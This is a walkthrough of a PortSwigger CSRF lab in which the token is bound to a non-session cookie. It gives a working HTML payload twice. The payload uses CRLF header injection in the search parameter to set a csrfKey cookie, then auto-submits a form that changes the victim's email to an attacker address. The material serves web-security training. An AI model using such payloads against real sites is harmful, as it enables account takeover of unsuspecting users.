# Lab: CSRF where token is tied to non-session cookie (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

Accounts: `wiener:peter` / `carlos:montoya`

## Vulnerability
`csrf` is bound to `csrfKey` cookie (not the session). Search reflects into `Set-Cookie` → CRLF cookie injection.

## Solution

1. Capture your `csrf` + `csrfKey` from a valid change-email request.
2. Inject `csrfKey` via search, then auto-submit form with matching token:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
